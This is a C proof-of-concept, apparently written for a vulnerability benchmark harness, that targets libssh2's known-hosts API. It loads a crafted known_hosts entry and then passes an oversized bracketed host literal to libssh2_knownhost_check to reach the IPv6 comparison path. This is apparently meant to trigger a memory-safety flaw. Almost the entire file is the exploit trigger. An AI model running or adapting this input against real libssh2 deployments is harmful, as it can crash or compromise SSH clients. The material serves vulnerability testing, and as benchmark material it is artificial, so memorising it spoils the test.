/*
 * PoC for the benchmark harness.
 *
 * Drives libssh2's known-hosts public API with a crafted, in-contract
 * known-hosts entry and a crafted bracketed host literal. Both are the
 * kind of attacker-influenced strings libssh2_knownhost_readline() and
 * libssh2_knownhost_check() are designed to accept: plain ASCII lines
 * and NUL-terminated hostnames. No network, no private symbols.
 */

#include <libssh2.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    struct libssh2_knownhost *found = NULL;
    char line[512];
    char host[256];
    size_t i;
    int rc;

    if(libssh2_init(0) != 0) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 2;
    }

    /* A plausible known_hosts line: a short, well-formed bracketed
       IPv6+port host entry with a base64-looking RSA key. */
    snprintf(line, sizeof(line),
             "[::1]:22 ssh-rsa %s",
             "AAAAB3NzaC1yc2EAAAADAQABAAABAQDQl6f6e0gTnLgL0f9Z6HV1q5FwPTh8d");

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_readline failed: %d\n", rc);
        return 2;
    }

    /* A bracketed host literal whose address part is longer than a
       real IPv6 literal can ever be, but still well within the length
       the library itself treats as a plausible address (<= 64 chars),
       and still carrying a matching "]:22" suffix so it reaches the
       same IPv6-comparison path as the stored entry above. */
    memcpy(host, "[", 1);
    for(i = 1; i < 56; i++)
        host[i] = 'a';
    strcpy(host + 56, "]:22");

    {
    static const char key[] =
        "AAAAB3NzaC1yc2EAAAADAQABAAABAQDQl6f6e0gTnLgL0f9Z6HV1q5FwPTh8d";
    rc = libssh2_knownhost_check(hosts, host, key, strlen(key),
                                 LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                 LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
                                 LIBSSH2_KNOWNHOST_KEY_SSHRSA,
                                 &found);

    printf("check rc=%d\n", rc);
    }

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
